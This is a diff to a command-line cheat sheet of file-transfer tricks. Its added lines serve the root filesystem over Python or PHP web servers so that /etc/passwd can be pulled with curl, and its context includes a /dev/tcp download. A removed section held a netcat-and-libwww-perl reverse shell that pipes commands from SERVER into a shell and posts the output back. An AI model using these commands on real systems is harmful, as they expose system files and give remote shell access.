@@ -6,8 +6,20 @@ NOTE:
 * HTTP server (read files)
 ----------------------------
 
-    [client]$ cd / && python -m SimpleHTTPServer 8080
-    [server]# curl http://HOST:8080/etc/passwd
+  -: Python webserver:
+        [server]# cd / && python -m SimpleHTTPServer 6667
+
+  -: PHP webserver:
+       php [options] -S <addr>:<port> [-t docroot]
+
+       Listen on all addresses of IPv4:
+         [server]# php -S 0:6667 -t /
+
+       Listen on all addresses of IPv6:
+         [server]# php -S [::0]:6667 -t /
+
+
+   [client]# curl http://server:6667/etc/passwd
 
 
 * Downloading files
@@ -22,28 +34,10 @@ NOTE:
         [client]$ exec 3<> /dev/tcp/SERVER/80; printf "GET /file.name HTTP/1.0\r\n\r\n" >&3; cat <&3 > /tmp/out.file
         [client]$ expect -c 'spawn telnet SERVER 80; expect -re "Escape character is '^]'."; send "GET /file.name HTTP/1.0\r\n\r\n"; interact' > /tmp/out.file
 
+    -: Python 
+        urlgrabber - a simple client for the urlgrabber python package
 
-* perl-libwww-perl
------------------------------
-   -: If perl-libwww-perl is installed you can use GET and POST commands
-      /usr/bin/GET
-      /usr/bin/POST
-
-   -: Reverse shell
-      Commands are executed after ^C exit, command output will be sent to POST SERVER:PORT
-
-      [server]# nc -vl CMDP // cmd port
-        or
-      [server]# nc -vl CMDP < cmds.txt // cmd port, send commands in bulk
-      [server]# nc -vl COUT // cmd output port
-
-      [client]$ GET http://SERVER:CMDP | $SHELL | POST http://SERVER:COUT
-
-    -: Download Files
-
-        [client]$ GET http://SERVER/file.sh > file.out
-        [client]$ echo|POST http://SERVER/path > file.out
-
+        [client]$ urlgrabber -o /path/to/out.file http://server/path/to/file
 
 * Whois
 -----------------------------
